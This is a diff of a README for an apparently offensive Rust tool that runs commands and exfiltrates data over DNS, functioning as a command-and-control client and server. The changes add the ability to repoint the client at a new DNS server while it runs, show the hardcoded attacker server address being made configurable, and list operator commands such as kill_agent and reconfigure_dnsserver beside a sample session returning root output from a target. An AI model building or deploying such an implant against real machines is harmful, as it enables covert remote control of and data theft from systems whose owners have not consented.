@@ -10,6 +10,8 @@ A simple rust client and server utilities for DNS based command execution and da
  
  - DNS client is running as a process, with a configurable sleep timer, default value is 5 seconds
 
+ - DNS server's address can also be configured dynamically while the client is running.
+
 
 ## Limitations
  - The DNS server is making use of rust's dns-server crate which is using UDP as a transport protocol, messages are limited to 512 bytes (RFC), however data is split into chunks so this is not that big limitation
@@ -20,7 +22,6 @@ A simple rust client and server utilities for DNS based command execution and da
 ## TODO
  - Switch from `std::process::Command` to a more native way for executing commands on linux and windows
  - Add the ability to download/upload files
- - Add the ability to dynamically reconfigure the DNS server's address (the same as the sleep)
  - Add support for configurable encryption key
  
  
@@ -43,8 +44,10 @@ root@2cc16c1a4c39:/mnt/dnsExfil#
 At the moment the DNS Server's address and port are hardcoded in the client, so make sure to change it
 
 ```rust
-//Address of the DNS Server to query
-pub static DNS_SERVER: &str = "172.17.0.3:53";
+    //Initial value
+    unsafe {
+        DNS_SERVER = "192.168.1.16:53".to_string();
+    }
 ```
 
 Run the client on the target machine, run the server and start inputing commands
@@ -60,7 +63,12 @@ uid=0(root) gid=0(root) groups=0(root)
 #> 
 2cc16c1a4c39
 
-#> 
+#> help
+[+] Available commands:
+        reconfigure_sleep INT -> Reconfigure the client's sleep interval, default is 5 secs
+        exit -> Terminates the DNS Server process, this wont terminate the client, it will keep polling every SLEEP secs
+        kill_agent -> Instructs the dns client to terminate its process
+        reconfigure_dnsserver ADDR -> Reconfigure the client's dns server connection string 
 ```
 
 The way it works is as follows:
